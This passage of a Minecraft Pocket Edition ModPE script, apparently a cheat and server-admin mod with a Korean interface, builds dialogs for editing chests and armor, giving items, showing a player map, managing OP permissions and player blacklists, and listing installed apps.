Dark.toast("저장되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function ghostHack(){
if(Dark.readAddOn("ghostHack")!="")
eval(Dark.readAddOn("ghostHack"));
else
Dark.toast("추가 파일이 없습니다.\n\"환경 설정\"에서 다운하실 수 있습니다.");
}


function showChestList(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
Dark.toast(loadChestCount+"개의 창고를 불러왔습니다.");
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var btns = new Array();
for(var n in loadChestData){
btns[n] = new android.widget.Button(ctx);
btns[n].setText("위치 : "+loadChestData[n][0][0]+", "+loadChestData[n][0][1]+", "+loadChestData[n][0][2]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
showChestData(v.getId());
}
});
layout.addView(btns[n]);
}
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("창고 목록");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function showChestData(nn){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var btns = new Array();
for(var n in loadChestData[nn][1]){
btns[n] = new android.widget.Button(ctx);
btns[n].setText("아이템 아이디 : "+loadChestData[nn][1][n][0]+", 개수 : "+loadChestData[nn][1][n][1]+", 데미지 : "+loadChestData[nn][1][n][2]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
editChestData(nn, v.getId(), btns[v.getId()]);
}
});
layout.addView(btns[n]);
}
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("창고 내용 수정("+loadChestData[nn][0][0]+", "+loadChestData[nn][0][1]+", "+loadChestData[nn][0][2]+")");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function editChestData(nn, n, btn, tf, arr){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var i, a, it;
if(tf){
if(arr[0][n][0]==undefined) i = 0;
else i = arr[0][n][0];
if(arr[0][n][1]==undefined) a = 0;
else a = arr[0][n][1];
if(arr[0][n][2]==undefined) it = 0;
else it = arr[0][n][2];
}
else{
if(loadChestData[nn][1][n][0]==undefined) i = 0;
else i = loadChestData[nn][1][n][0];
if(loadChestData[nn][1][n][1]==undefined) a = 0;
else a = loadChestData[nn][1][n][1];
if(loadChestData[nn][1][n][2]==undefined) it = 0;
else it = loadChestData[nn][1][n][2];
}
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
var loc5 = new android.widget.TextView(ctx);
var loc6 = new android.widget.EditText(ctx);
loc1.setText("아이템 아이디 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("아이템 아이디를 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
loc2.setText(i+"");
loc3.setText("아이템 개수 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("아이템 개수를 입력하세요...");
loc4.setTextColor(white);
loc4.setInputType(number);
loc4.setText(a+"");
loc5.setText("아이템 데미지 : ");
loc5.setTextSize(18);
loc5.setTextColor(white);
loc6.setHint("아이템 데미지를 입력하세요...");
loc6.setTextColor(white);
loc6.setInputType(number);
loc6.setText(it+"");
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
layout.addView(loc5);
layout.addView(loc6);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("창고 내용 수정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(tf){
Level.setChestSlot(arr[1][0], arr[1][1], arr[1][2], n, Number(loc2.getText()), Number(loc6.getText()), Number(loc4.getText()));
}
else{
Level.setChestSlot(loadChestData[nn][0][0], loadChestData[nn][0][1], loadChestData[nn][0][2], n, Number(loc2.getText()), Number(loc6.getText()), Number(loc4.getText()));
loadChestData[nn][1][n] = [Number(loc2.getText()), Number(loc4.getText()), Number(loc6.getText())];
}
btn.setText("아이템 아이디 : "+loc2.getText()+", 개수 : "+loc4.getText()+", 데미지 : "+loc6.getText());
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function selectMap(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var dir = new java.io.File(sdcard+"/games/com.mojang/minecraftWorlds/").list().sort();
var dir2 = [];
for each(var ff in dir){
var fff = new java.io.File(sdcard+"/games/com.mojang/minecraftWorlds/"+ff);
if(ff.substring(0, 1)!="."&&fff.isDirectory())
dir2.push(ff);
}
dialog.setItems(dir2, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
ModPE.selectLevel(dir2[w]);
Dark.toast("이동합니다.");
}
}));
dialog.setTitle("다른 월드로 이동 - 맵 폴더 선택");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function showArmorList(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var menus = ["가죽 갑옷 세트", "사슬 갑옷 세트", "철 갑옷 세트", "다이아몬드 갑옷 세트", "금 갑옷 세트"];
dialog.setItems(menus, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
if(tf){
switch(w){
case 0 : 
addItemInventory(298, 1, 0);
addItemInventory(299, 1, 0);
addItemInventory(300, 1, 0);
addItemInventory(301, 1, 0);
break;
case 1 : 
addItemInventory(302, 1, 0);
addItemInventory(303, 1, 0);
addItemInventory(304, 1, 0);
addItemInventory(305, 1, 0);
break;
case 2 : 
addItemInventory(306, 1, 0);
addItemInventory(307, 1, 0);
addItemInventory(308, 1, 0);
addItemInventory(309, 1, 0);
break;
case 3 : 
addItemInventory(310, 1, 0);
addItemInventory(311, 1, 0);
addItemInventory(312, 1, 0);
addItemInventory(313, 1, 0);
break;
case 4 : 
addItemInventory(314, 1, 0);
addItemInventory(315, 1, 0);
addItemInventory(316, 1, 0);
addItemInventory(317, 1, 0);
break;
}
Dark.toast(menus[w]+"이 지급되었습니다.");
}
else{
switch(w){
case 0 : 
Player.setArmorSlot(0, 298, 0);
Player.setArmorSlot(1, 299, 0);
Player.setArmorSlot(2, 300, 0);
Player.setArmorSlot(3, 301, 0);
break;
case 1 : 
Player.setArmorSlot(0, 302, 0);
Player.setArmorSlot(1, 303, 0);
Player.setArmorSlot(2, 304, 0);
Player.setArmorSlot(3, 305, 0);
break;
case 2 : 
Player.setArmorSlot(0, 306, 0);
Player.setArmorSlot(1, 307, 0);
Player.setArmorSlot(2, 308, 0);
Player.setArmorSlot(3, 309, 0);
break;
case 3 : 
Player.setArmorSlot(0, 310, 0);
Player.setArmorSlot(1, 311, 0);
Player.setArmorSlot(2, 312, 0);
Player.setArmorSlot(3, 313, 0);
break;
case 4 : 
Player.setArmorSlot(0, 314, 0);
Player.setArmorSlot(1, 315, 0);
Player.setArmorSlot(2, 316, 0);
Player.setArmorSlot(3, 317, 0);
break;
}
Dark.toast(menus[w]+"를 착용하였습니다.");
}
}
}));
dialog.setTitle("갑옷 종류 선택");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function armorEdit(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuA = new android.widget.PopupWindow();
var title = makeTitle("갑옷 슬롯 수정");
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btns = new Array();
var menus = ["투구", "윗옷", "바지", "신발"];
for(var n in menus){
btns[n] = makeButton(menus[n]+" ("+Player.getArmorSlot(n)+", "+Player.getArmorSlotDamage(n)+")");
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
loadArmor(v.getId());
}
});
layout.addView(btns[n]);
}
var fix = makeButton("갑옷 내구도 수리");
var ar = makeButton("갑옷 바로 입기");
fix.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Player.setArmorSlot(0, Player.getArmorSlot(0), 0);
Player.setArmorSlot(1, Player.getArmorSlot(1), 0);
Player.setArmorSlot(2, Player.getArmorSlot(2), 0);
Player.setArmorSlot(3, Player.getArmorSlot(3), 0);
Dark.toast("수리되었습니다.");
}
});
ar.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
showArmorList();
}
});
layout.addView(fix);
layout.addView(ar);
var exit = makeExit(menuA);
layout.addView(exit);
var scroll = makeScroll(layout, menuA);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuA.setContentView(layout2);
menuA.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function loadArmor(type){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var menus = ["투구", "윗옷", "바지", "신발"];
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
loc1.setText("아이템 아이디 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("아이템 아이디를 입력하세요");
loc2.setTextColor(white);
loc2.setInputType(number);
loc2.setText(Player.getArmorSlot(type)+"");
loc3.setText("아이템 데미지 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("아이템 데미지를 입력하세요");
loc4.setTextColor(white);
loc4.setInputType(number);
loc4.setText(Player.getArmorSlotDamage(type)+"");
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("갑옷 수정 - "+menus[type]);
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
Player.setArmorSlot(type, loc2.getText(), loc4.getText());
Dark.toast("수정되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}}));
}


function makeMinecraftClock(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
if(tf){
clock2 = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
clockSeek = new android.widget.SeekBar(ctx);
var tym = Level.getTime();
if(mcpev2){
clockSeek.setMax(24000);
while(tym>24000)
tym -= 24000;
}
else{
clockSeek.setMax(19200);
while(tym>19200)
tym -= 19200;
}
clockSeek.setProgress(tym);
clockSeek.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
Level.setTime(clockSeek.getProgress());
}
}));
setDragListenerForSeekBar(clock2, clockSeek, false);
layout.addView(clockSeek);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
clock2.setContentView(scroll);
clock2.setWidth(dip2px(ctx, 135));
clock2.setHeight(dip2px(ctx, 30));
clock2.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(150, 80, 80, 80)));
if(Dark.read("mClockX")=="") clock2.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.RIGHT|android.view.Gravity.TOP, 80, dip2px(ctx, 22));
else clock2.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.LEFT|android.view.Gravity.TOP, Dark.read("mClockX"), Dark.read("mClockY"));
}
else{
if(clock2!=null){
clock2.dismiss();
clock2 = null;
}
}
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function loadAppList(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var intent = new android.content.Intent(android.content.Intent.ACTION_MAIN, null);
intent.addCategory(android.content.Intent.CATEGORY_LAUNCHER);
var pm = ctx.getPackageManager();
var appList = pm.queryIntentActivities(intent, 0);
if(tf){
var names = [], list = [];
for(var n=0;n<appList.size();n++){
var pack = appList.get(n);
var appName = pack.loadLabel(pm).toString();
var packName = pack.activityInfo.applicationInfo.packageName;
if(appPack) names.push(appName+" ("+packName+")");
else names.push(appName);
list.push([appName, packName]);
}
names.sort();
list.sort();
dialog.setItems(names, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
appOption(list[w][1], names[w], pm);
}
}));
}
else{
var list = [];
for(var n=0;n<appList.size();n++){
var pack = appList.get(n);
list.push(pack.activityInfo.applicationInfo.packageName);
}
list.sort();
dialog.setItems(list, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
appOption(list[w], null, pm);
}
}));
}
dialog.setTitle("설치된 어플 보기");
dialog.setNegativeButton("취소", null);
dialog.show();
Dark.toast(appList.size()+"개의 어플을 불러왔습니다.");
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function appOption(pack, name, pm){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var menus = ["어플 실행", "어플 삭제"];
dialog.setItems(menus, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
try{
switch(w){
case 0 : 
ctx.startActivity(pm.getLaunchIntentForPackage(pack.toString()));
if(name==null) Dark.toast(pack+"(을)를 실행합니다.");
else Dark.toast(name+"(을)를 실행합니다.");
break;
case 1 : 
ctx.startActivity(new android.content.Intent(android.content.Intent.ACTION_DELETE, android.net.Uri.fromParts("package", pack, null)));  //original sorce from Dark
break;
}
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
if(name==null) dialog.setTitle("어플 관리 -"+pack);
else dialog.setTitle("어플 관리 - "+name);
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function showModList(nn){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
if(nn==1) var path = "/data/data/net.zhuoweizhang.mcpelauncher";
if(nn==2) var path = "/data/data/net.zhuoweizhang.mcpelauncher.pro";
var dir = new java.io.File(path+"/app_ptpatches").list();
var dir2 = new java.io.File(path+"/app_Patches").list();
var dir3 = new java.io.File(sdcard+"/Android/data/com.snowbound.pockettool.free/Patches").list();
var dir4 = dir.concat(dir2, dir3).sort();
dialog.setItems(dir4, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
Dark.toast("열 수는 없습니다.");
}
}));
dialog.setTitle("적용된 모드 목록");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.toast("루팅되어있지 않습니다.");
return;
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function openAnalogClock(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var clock = new android.widget.AnalogClock(ctx);
layout.addView(clock);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("시계");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function makeMap(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var mr = Number(Dark.read("map"));
if(mr=="") mr = 30;
var map = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var mx, my, mz;
mx = Player.getX();
my = Player.getY()-2;
mz = Player.getZ();
var mapData = new android.graphics.Bitmap.createBitmap(2*mr*10, 2*mr*10, android.graphics.Bitmap.Config.ARGB_8888);
var canvas = new android.graphics.Canvas(mapData);
var p = new android.graphics.Paint();
for(var n=-mr;n<mr+1;n++){
for(var m=-mr;m<mr+1;m++){
for(var yy=my+5;yy>my-4;yy--){
var b = getTile(mx+n, yy, mz+m);
if(b!=0) break;
}
if(b==0) p.setARGB(0, 0, 0, 0);
else if(b==2||b==253||b==31||b==175||b==37||b==38||b==39||b==40) p.setARGB(255, 0, 255, 45);
else if(b==3||b==243||b==159||b==172||b==60||b==248||b==249) p.setARGB(255, 153, 109, 0);
else if(b==1||(b>=13&&b<=16)||b==4||b==21||b==48||b==82||b==98||b==110||b==129||b==139||b==61||b==62||b==245||b==67||b==71||b==73||b==74||b==109||b==255||b==101) p.setARGB(255, 120, 120, 120);
else if(b==8||b==9||b==22) p.setARGB(255, 0, 0, 255);
else if(b==79||b==174||b==247) p.setARGB(255, 160, 180, 255);
else if(b==5||b==17||b==32||b==47||b==53||b==54||b==58||b==63||b==64||b==65||b==68||b==85||b==107||b==134||b==135||b==136||b==157||b==158||b==162||b==163||b==164||b==183||b==184||b==185||b==186||b==187||b==96) p.setARGB(255, 164, 135, 81);
else if(b==6||b==18||b==81||b==83||b==103||b==104||b==105||b==106||b==111||b==120||b==133||b==141||b==142||b==161||b==244||b==254) p.setARGB(255, 64, 148, 0);
else if(b==10||b==11||b==51||b==26||b==27||b==46||b==152||b==246) p.setARGB(255, 255, 0, 0);
else if(b==12||b==24||b==19||b==41||b==89||b==121||b==170||b==198) p.setARGB(255, 255, 255, 0);
else if(b==86||b==91||b==127) p.setARGB(255, 255, 180, 0);
else if(b==57) p.setARGB(255, 0, 255, 255);
else if(b==87) p.setARGB(255, 150, 0, 0);
else if(b==45) p.setARGB(255, 150, 80, 65);
else if(b==20||b==30||b==35||b==42||b==43||b==44||b==78||b==80||b==92||b==95||b==102||b==126||b==155||b==156||b==171||b==50) p.setARGB(255, 255, 255, 255);
else p.setARGB(255, 0, 0, 0);
canvas.drawRect((n+mr)*10, (m+mr)*10, (n+mr+1)*10, (m+mr+1)*10, p);
}}
p.setTextSize(20);
p.setTextAlign(android.graphics.Paint.Align.CENTER);
p.setARGB(255, 0, 0, 0);
canvas.drawText("●", mr*10, mr*10, p);
var players2 = new Array();
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players2.push(e);
}
var players = removeDouble(players2);
var px, pz;
for each(var pp in players){
px = Math.abs(mx-Entity.getX(pp));
pz = Math.abs(mz-Entity.getZ(pp));
if(px<=mr&&pz<=mr&&ad!=pp){
p.setTextSize(20);
p.setTextAlign(android.graphics.Paint.Align.CENTER);
p.setARGB(255, 255, 255, 255);
canvas.drawText("●", Math.round((mx-Entity.getX(pp))+mr)*10, Math.round((mz-Entity.getZ(pp))+mr)*10, p);
}
}
var back = new android.graphics.drawable.BitmapDrawable(mapData);
map.setContentView(layout);
map.setFocusable(true);
map.setWidth(ctx.getWindowManager().getDefaultDisplay().getHeight()*19/20);
map.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight()*19/20);
map.setBackgroundDrawable(back);
map.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function inputMapData(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc2 = new android.widget.EditText(ctx);
loc2.setHint("지도 범위를 입력하세요...");
layout.addView(loc2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("지도 범위 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
Dark.save("map", loc2.getText().toString());
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function makeFovEditor(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
if(tf){
fovM = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var fovSeek = new android.widget.SeekBar(ctx);
fovSeek.setMax(200);
fovSeek.setMin(1);
fovSeek.setProgress(20);
fovSeek.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
ModPE.setFov(fovSeek.getProgress());
}
}));
setDragListenerForSeekBar(fovM, fovSeek, true);
layout.addView(fovSeek);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
fovM.setContentView(scroll);
fovM.setWidth(dip2px(ctx, 110));
fovM.setHeight(dip2px(ctx, 30));
fovM.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(150, 80, 80, 80)));
if(Dark.read("mFovX")=="") fovM.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.LEFT|android.view.Gravity.TOP, 80, dip2px(ctx, 38));
else fovM.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.LEFT|android.view.Gravity.TOP, Dark.read("mFovX"), Dark.read("mFovY"));
}
else{
if(fovM!=null){
fovM.dismiss();
fovM = null;
}
}
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function openChest(x, y, z){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var i, a, it;
var data = [];
for(var n=0;n<27;n++){
i = Level.getChestSlot(x, y, z, n);
a = Level.getChestSlotCount(x, y, z, n);
it = Level.getChestSlotData(x, y, z, n);
data.push([i, a, it]);
}
var btns = new Array();
for(var n in data){
btns[n] = new android.widget.Button(ctx);
btns[n].setText("아이템 아이디 : "+data[n][0]+", 개수 : "+data[n][1]+", 데미지 : "+data[n][2]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
editChestData(null, v.getId(), btns[v.getId()], true, [data, [x, y, z]]);
}
});
layout.addView(btns[n]);
}
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("창고 내용 수정");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function potionList(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var code = null;
var types = ["포션 종류 선택", "야간 투시", "투명화", "도약", "화염저항", "신속", "구속", "수중호흡", "회복", "고통", "독", "재생", "힘", "나약함"];
var codes = [null, 5, 7, 9, 12, 14, 17, 19, 21, 23, 26, 28, 31, 34];
var spin = new android.widget.Spinner(ctx);
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, types);
spin.setAdapter(adapter);
spin.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
code = codes[p];
}
}));
layout.addView(spin);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("개수 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("개수를 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
layout.addView(loc1);
layout.addView(loc2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("포션 지급");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(code!=null){
addItemInventory(373, loc2.getText(), code);
Dark.toast("지급되었습니다.");
}
else{
Dark.toast("포션 종류를 선택하지 않아서 지급되지 않습니다.");
}
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function opManager(nn){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var cmds = [".day", ".night", ".tp", ".add", ".give", ".go", ".health", ".kill", ".call", ".heal", ".kick"];
var checks = new Array();
for(var n in cmds){
checks[n] = new android.widget.CheckBox(ctx);
checks[n].setText(cmds[n]);
checks[n].setId(n);
checks[n].setTextColor(white);
checks[n].setChecked(opData[nn][n]);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
opData[nn][check.getId()] = onoff;
}
}));
layout.addView(checks[n]);
}
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("OP 관리 - "+Player.getName(ops[nn]));
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function fireEditor(tf){
if(Dark.readAddOn("fireEditor")!="")
eval(Dark.readAddOn("fireEditor"));
else if(tf)
Dark.toast("추가 파일이 없습니다.\n\"환경 설정\"에서 다운하실 수 있습니다.");
}


function openMineDialog(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var players = new Array();
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players.push(e);
}
if(antiTwo){
var players2 = removeDouble(players);
players = players2;
}
if(playerSort){
var players2 = players.sort();
players = players2;
}
var checks = new Array();
for(var n in players){
checks[n] = new android.widget.CheckBox(ctx);
checks[n].setText(Player.getName(players[n]));
checks[n].setId(n);
checks[n].setTextColor(white);
if(antiMine.indexOf(players[n])!=-1) checks[n].setChecked(true);
else checks[n].setChecked(false);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff==true){
antiMine.push(players[check.getId()]);
}
else if(onoff==false){
antiMine.splice(antiMine.indexOf(players[check.getId()]), 1);
}
}
}));
layout.addView(checks[n]);
}
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout),
dialog.setView(scroll);
dialog.setTitle("블록 파괴 금지 대상자 목록");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function openBlackList(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var list = new android.widget.EditText(ctx);
list.setHint("닉네임을 입력하세요...");
list.setText(blackList);
list.setTextColor(white);
layout.addView(list);
var pl = new android.widget.Button(ctx);
pl.setText("접속중인 플레이어 목록에서 가져오기");
pl.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
playerList(list);
}
});
layout.addView(pl);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("블랙 리스트 - 닉네임 밴");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("저장", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
blackList = list.getText().toString();
if(list.getText()==""){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/blackList.txt");
if(file.exists()) file.delete();
}
else{
Dark.save("blackList", blackList);
}
Dark.toast("저장되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function playerList(list, tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var player;
var players = new Array();
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players.push(e);
}
if(antiTwo){
var players2 = removeDouble(players);
players = players2;
}
if(playerSort){
var players2 = players.sort();
players = players2;
}
var radios = new android.widget.RadioGroup(ctx);
radios.setOrientation(1);
var radio = new Array();
for(var n in players){
radio[n] = new android.widget.RadioButton(ctx);
radio[n].setText(Player.getName(players[n]));
radio[n].setId(n);
radios.addView(radio[n]);
}
radios.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
player = players[checkedId];
}
}));
layout.addView(radios);
var pad = dip2px(ctx, 5);
